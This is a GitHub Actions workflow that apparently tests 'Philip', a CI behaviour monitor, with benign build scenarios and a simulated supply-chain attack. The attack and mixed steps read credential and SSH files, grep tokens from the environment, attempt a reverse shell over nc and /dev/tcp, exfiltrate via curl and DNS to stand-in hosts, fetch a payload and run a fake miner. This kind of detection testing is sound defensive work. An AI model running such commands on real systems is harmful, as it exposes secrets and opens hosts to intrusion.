name: Philip E2E Test

on:
  workflow_dispatch:
    inputs:
      scenario:
        description: "Test scenario to run"
        required: true
        type: choice
        options:
          - baseline
          - attack
          - mixed
          - docker-build
          - python-ci
          - go-ci
          - deploy-sim
          - full-baseline
        default: baseline
      iteration:
        description: "Iteration number (for baseline training)"
        required: false
        default: "1"

jobs:
  build-v1:
    name: "E2E (${{ inputs.scenario }} #${{ inputs.iteration }})"
    runs-on: [self-hosted, philip]
    steps:
      - uses: actions/checkout@v4

      # --- Philip monitoring starts here ---
      - name: Philip monitor start
        uses: ./action
        with:
          mode: monitor

      # =============================================================
      # BASELINE — normal CI/CD behavior
      # =============================================================
      - name: "Install dependencies"
        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
        run: |
          echo "Installing project dependencies..."
          curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
          curl -sf https://pypi.org/simple/requests/ > /dev/null 2>&1 || true
          wget -q -O /dev/null https://registry.npmjs.org/lodash 2>/dev/null || true
          git --version
          python3 --version 2>/dev/null || true
          sleep 1

      - name: "Build"
        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
        env:
          GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
        run: |
          echo "Building project..."
          go vet ./... 2>/dev/null || true
          go build -o /tmp/philip-build-${{ github.run_id }} ./backend/cmd/philip-server 2>/dev/null || true
          ls -la
          find . -name "*.go" -type f | head -20 | xargs wc -l 2>/dev/null || true
          rm -f /tmp/philip-build-${{ github.run_id }}
          echo "Build complete"

      - name: "Run tests"
        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
        env:
          GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
        run: |
          echo "Running tests..."
          go test ./backend/detection/... -count=1 -short 2>/dev/null || true
          go test ./backend/baseline/... -count=1 -short 2>/dev/null || true
          echo "Tests complete"

      - name: "Lint and check"
        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
        run: |
          echo "Running linters..."
          gofmt -l ./backend/ 2>/dev/null || true
          go vet ./backend/... 2>/dev/null || true
          echo "Lint complete"

      # =============================================================
      # ATTACK — simulated supply chain attack
      # =============================================================
      - name: "Malicious: credential exfiltration"
        if: inputs.scenario == 'attack'
        run: |
          echo "=== SIMULATED ATTACK: credential access ==="
          cat /etc/passwd > /dev/null 2>&1 || true
          ls -la /home/runner/.ssh/ 2>/dev/null || true
          cat /proc/self/environ > /dev/null 2>&1 || true
          env | grep -i token > /dev/null 2>&1 || true

      - name: "Malicious: reverse shell attempt"
        if: inputs.scenario == 'attack'
        run: |
          echo "=== SIMULATED ATTACK: reverse shell ==="
          timeout 2 nc -z 198.51.100.1 4444 2>/dev/null || true
          timeout 2 bash -c 'echo test > /dev/tcp/198.51.100.1/4444' 2>/dev/null || true

      - name: "Malicious: data exfiltration"
        if: inputs.scenario == 'attack'
        run: |
          echo "=== SIMULATED ATTACK: exfiltration ==="
          timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true
          timeout 2 nslookup "$(whoami).evil.example.com" 2>/dev/null || true
          timeout 2 curl -sf http://198.51.100.1:4444/payload -o /tmp/payload 2>/dev/null || true

      - name: "Malicious: crypto miner"
        if: inputs.scenario == 'attack'
        run: |
          echo "=== SIMULATED ATTACK: crypto miner ==="
          touch /tmp/xmrig && chmod +x /tmp/xmrig || true
          timeout 2 /tmp/xmrig --donate-level=0 2>/dev/null || true
          rm -f /tmp/xmrig

      # =============================================================
      # MIXED — mostly benign + one suspicious call
      # =============================================================
      - name: "Mixed: suspicious network call"
        if: inputs.scenario == 'mixed'
        run: |
          echo "=== MIXED: suspicious action in a normal build ==="
          timeout 2 curl -sf http://198.51.100.1:9999/unexpected 2>/dev/null || true

      # =============================================================
      # DOCKER-BUILD — simulates a containerized build pipeline
      # =============================================================
      - name: "Docker: create project"
        if: inputs.scenario == 'docker-build' || inputs.scenario == 'full-baseline'
        run: |
          echo "Setting up Docker build project..."
          WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
          mkdir -p "${WORKDIR}"
          cat > "${WORKDIR}/app.js" << 'APPEOF'
          const http = require('http');
          const server = http.createServer((req, res) => {
            res.writeHead(200);
            res.end('Hello from Philip test app\n');
          });
          server.listen(3000);
          APPEOF
          cat > "${WORKDIR}/package.json" << 'PKGEOF'
          {"name":"philip-test-app","version":"1.0.0","main":"app.js","scripts":{"start":"node app.js"}}
          PKGEOF
          cat > "${WORKDIR}/Dockerfile" << 'DEOF'
          FROM node:20-alpine
          WORKDIR /app
          COPY package.json ./
          RUN npm install --production 2>/dev/null || true
          COPY app.js ./
          EXPOSE 3000
          CMD ["node", "app.js"]
          DEOF
          echo "Project files created in ${WORKDIR}"

      - name: "Docker: build and inspect"
        if: inputs.scenario == 'docker-build' || inputs.scenario == 'full-baseline'
        run: |
          WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
          TAG="philip-test:${{ github.run_id }}"
          echo "Building Docker image..."
          docker build -t "${TAG}" "${WORKDIR}"
          echo "Tagging image..."
          docker tag "${TAG}" "philip-test:latest"
          echo "Inspecting image..."
          docker inspect "${TAG}" | head -40
          docker images | grep philip-test
          docker history "${TAG}" --no-trunc | head -20
          echo "Simulating docker login (expected to fail)..."
          echo "fake-password" | docker login --username fake-user --password-stdin 2>/dev/null || echo "(login failed as expected — no real creds)"

      - name: "Docker: cleanup"
        if: (inputs.scenario == 'docker-build' || inputs.scenario == 'full-baseline') && always()
        run: |
          docker rmi "philip-test:${{ github.run_id }}" "philip-test:latest" 2>/dev/null || true
          rm -rf "/tmp/philip-docker-${{ github.run_id }}"

      # =============================================================
      # PYTHON-CI — simulates a Python project pipeline
      # =============================================================
      - name: "Python: create project"
        if: inputs.scenario == 'python-ci' || inputs.scenario == 'full-baseline'
        run: |
          echo "Setting up Python project..."
          WORKDIR="/tmp/philip-python-${{ github.run_id }}"
          mkdir -p "${WORKDIR}/tests"
          cat > "${WORKDIR}/requirements.txt" << 'REQEOF'
          requests>=2.28.0
          flask>=2.3.0
          pytest>=7.0.0
          flake8>=6.0.0
          REQEOF
          cat > "${WORKDIR}/app.py" << 'PYEOF'
          """Simple Flask application for Philip e2e test."""

          def add(a, b):
              """Add two numbers."""
              return a + b

          def greet(name):
              """Return a greeting string."""
              return f"Hello, {name}!"

          def is_even(n):
              """Check if a number is even."""
              return n % 2 == 0
          PYEOF
          cat > "${WORKDIR}/tests/test_app.py" << 'TESTEOF'
          """Tests for app module."""
          import sys, os
          sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
          from app import add, greet, is_even

          def test_add():
              assert add(2, 3) == 5
              assert add(-1, 1) == 0

          def test_greet():
              assert greet("World") == "Hello, World!"

          def test_is_even():
              assert is_even(4) is True
              assert is_even(3) is False
          TESTEOF
          cat > "${WORKDIR}/setup.py" << 'SETUPEOF'
          from setuptools import setup, find_packages
          setup(
              name="philip-test-app",
              version="0.1.0",
              py_modules=["app"],
              install_requires=["requests", "flask"],
          )
          SETUPEOF
          echo "Python project created in ${WORKDIR}"

      - name: "Python: install and test"
        if: inputs.scenario == 'python-ci' || inputs.scenario == 'full-baseline'
        run: |
          WORKDIR="/tmp/philip-python-${{ github.run_id }}"
          cd "${WORKDIR}"
          echo "Installing dependencies..."
          pip install -r requirements.txt 2>&1 | tail -5
          echo "Running pytest..."
          python -m pytest tests/ -v 2>&1 || true
          echo "Running flake8..."
          python -m flake8 app.py --max-line-length=120 2>&1 || true
          echo "Building sdist..."
          python setup.py sdist 2>&1 | tail -5 || true
          ls -la dist/ 2>/dev/null || true
          echo "Python CI complete"

      - name: "Python: cleanup"
        if: (inputs.scenario == 'python-ci' || inputs.scenario == 'full-baseline') && always()
        run: |
          rm -rf "/tmp/philip-python-${{ github.run_id }}"

      # =============================================================
      # GO-CI — simulates a Go project pipeline
      # =============================================================
      - name: "Go: create project"
        if: inputs.scenario == 'go-ci' || inputs.scenario == 'full-baseline'
        run: |
          echo "Setting up Go project..."
          WORKDIR="/tmp/philip-go-${{ github.run_id }}"
          mkdir -p "${WORKDIR}"
          cat > "${WORKDIR}/go.mod" << 'MODEOF'
          module github.com/philip-test/sample

          go 1.21
          MODEOF
          cat > "${WORKDIR}/main.go" << 'MAINEOF'
          package main

          import (
              "fmt"
              "net/http"
              "os"
          )

          func handler(w http.ResponseWriter, r *http.Request) {
              fmt.Fprintf(w, "Hello from Philip test service")
          }

          func add(a, b int) int {
              return a + b
          }

          func main() {
              port := os.Getenv("PORT")
              if port == "" {
                  port = "8080"
              }
              http.HandleFunc("/", handler)
              fmt.Printf("Listening on :%s\n", port)
              http.ListenAndServe(":"+port, nil)
          }
          MAINEOF
          cat > "${WORKDIR}/main_test.go" << 'TESTEOF'
          package main

          import "testing"

          func TestAdd(t *testing.T) {
              if add(2, 3) != 5 {
                  t.Error("Expected 5")
              }
              if add(-1, 1) != 0 {
                  t.Error("Expected 0")
              }
          }

          func TestHandler(t *testing.T) {
              // placeholder test
              t.Log("Handler test placeholder")
          }
          TESTEOF
          echo "Go project created in ${WORKDIR}"

      - name: "Go: build and test"
        if: inputs.scenario == 'go-ci' || inputs.scenario == 'full-baseline'
        env:
          GOCACHE: /tmp/philip-gocache-go-${{ github.run_id }}
          GOPATH: /tmp/philip-gopath-${{ github.run_id }}
        run: |
          WORKDIR="/tmp/philip-go-${{ github.run_id }}"
          cd "${WORKDIR}"
          echo "Downloading modules..."
          go mod download 2>&1 || true
          echo "Running go vet..."
          go vet ./... 2>&1
          echo "Building..."
          go build -o "${WORKDIR}/sample-app" . 2>&1
          ls -la "${WORKDIR}/sample-app"
          echo "Running tests..."
          go test -v -count=1 ./... 2>&1
          echo "Go CI complete"

      - name: "Go: cleanup"
        if: (inputs.scenario == 'go-ci' || inputs.scenario == 'full-baseline') && always()
        run: |
          rm -rf "/tmp/philip-go-${{ github.run_id }}"
          rm -rf "/tmp/philip-gocache-go-${{ github.run_id }}"
          rm -rf "/tmp/philip-gopath-${{ github.run_id }}"

      # =============================================================
      # DEPLOY-SIM — simulates a deployment pipeline (no real infra)
      # =============================================================
      - name: "Deploy: check tooling versions"
        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
        run: |
          echo "Checking deployment tool versions..."
          aws --version 2>/dev/null || echo "(aws cli not installed)"
          kubectl version --client 2>/dev/null || echo "(kubectl not installed)"
          terraform --version 2>/dev/null || echo "(terraform not installed)"
          helm version 2>/dev/null || echo "(helm not installed)"
          docker --version 2>/dev/null || echo "(docker not installed)"
          jq --version 2>/dev/null || echo "(jq not installed)"

      - name: "Deploy: simulate artifact download"
        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
        run: |
          WORKDIR="/tmp/philip-deploy-${{ github.run_id }}"
          mkdir -p "${WORKDIR}/artifacts"
          echo "Downloading release artifacts..."
          curl -sf -o "${WORKDIR}/artifacts/checksums.txt" https://raw.githubusercontent.com/actions/runner/main/LICENSE 2>/dev/null || echo "placeholder" > "${WORKDIR}/artifacts/checksums.txt"
          echo "Verifying checksums..."
          sha256sum "${WORKDIR}/artifacts/checksums.txt" || true
          echo "artifact-v1.2.3.tar.gz" > "${WORKDIR}/artifacts/manifest.txt"
          cat "${WORKDIR}/artifacts/manifest.txt"

      - name: "Deploy: simulate cloud operations"
        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
        run: |
          echo "Simulating AWS operations (expected to fail — no creds)..."
          aws sts get-caller-identity 2>/dev/null || echo "(no AWS credentials — expected)"
          aws s3 ls 2>/dev/null || echo "(no AWS credentials — expected)"
          echo "Simulating kubectl operations..."
          kubectl get nodes 2>/dev/null || echo "(no cluster — expected)"
          kubectl get pods 2>/dev/null || echo "(no cluster — expected)"
          echo "Simulating terraform..."
          terraform init -backend=false 2>/dev/null || echo "(no terraform config — expected)"

      - name: "Deploy: simulate health checks"
        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
        run: |
          echo "Running post-deploy health checks..."
          timeout 5 curl -sf http://localhost:8080/healthz 2>/dev/null || echo "(health endpoint not available — expected)"
          timeout 5 curl -sf -o /dev/null -w "HTTP %{http_code}" http://localhost:8080/api/v1/baselines 2>/dev/null || echo "(API check — may not be available)"
          echo "Checking DNS resolution..."
          nslookup github.com 2>/dev/null | head -5 || true
          dig github.com A +short 2>/dev/null || true
          echo "Checking connectivity..."
          timeout 5 curl -sf -o /dev/null -w "%{http_code}" https://github.com 2>/dev/null && echo " github.com reachable" || echo " github.com unreachable"
          echo "Deploy simulation complete"

      - name: "Deploy: cleanup"
        if: (inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline') && always()
        run: |
          rm -rf "/tmp/philip-deploy-${{ github.run_id }}"

      # =============================================================
      # FULL-BASELINE — also runs the original baseline steps
      # =============================================================
      - name: "Full-baseline: standard CI steps"
        if: inputs.scenario == 'full-baseline'
        run: |
          echo "Running standard baseline CI steps as part of full-baseline..."
          curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
          curl -sf https://pypi.org/simple/requests/ > /dev/null 2>&1 || true
          wget -q -O /dev/null https://registry.npmjs.org/lodash 2>/dev/null || true
          git --version
          python3 --version 2>/dev/null || true
          echo "Building project..."
          go vet ./... 2>/dev/null || true
          go build -o /tmp/philip-fullbaseline-${{ github.run_id }} ./backend/cmd/philip-server 2>/dev/null || true
          rm -f /tmp/philip-fullbaseline-${{ github.run_id }}
          echo "Running tests..."
          go test ./backend/detection/... -count=1 -short 2>/dev/null || true
          go test ./backend/baseline/... -count=1 -short 2>/dev/null || true
          echo "Running linters..."
          gofmt -l ./backend/ 2>/dev/null || true
          go vet ./backend/... 2>/dev/null || true
          echo "Full-baseline standard CI complete"

      # =============================================================
      # Report — this runs ON the runner, hitting localhost
      # =============================================================
      - name: "Philip results"
        if: always()
        run: |
          echo ""
          echo "========================================="
          echo " Philip Report"
          echo " Scenario:  ${{ inputs.scenario }}"
          echo " Iteration: ${{ inputs.iteration }}"
          echo "========================================="
          echo ""
          echo "--- Baseline ---"
          curl -sf "http://localhost:8080/api/v1/baselines?repository=${{ github.repository }}" \
            | jq '{status, total_jobs_observed, process_count: (.process_profiles | length), network_count: (.network_profiles | length)}' \
            2>/dev/null || echo "(no baseline yet)"
          echo ""
          echo "--- Findings ---"
          curl -sf "http://localhost:8080/api/v1/findings?repository=${{ github.repository }}" \
            | jq '.[] | {severity, verdict, confidence, reasoning}' \
            2>/dev/null || echo "(no findings)"
          echo ""
          echo "--- Agent health ---"
          systemctl is-active philip-agent 2>/dev/null && echo "philip-agent: running" || echo "philip-agent: not running"
          systemctl is-active tetragon 2>/dev/null && echo "tetragon: running" || echo "tetragon: not running"

      - name: "Cleanup"
        if: always()
        run: |
          rm -rf /tmp/philip-gocache-${{ github.run_id }}
          rm -f /tmp/philip-build-${{ github.run_id }}
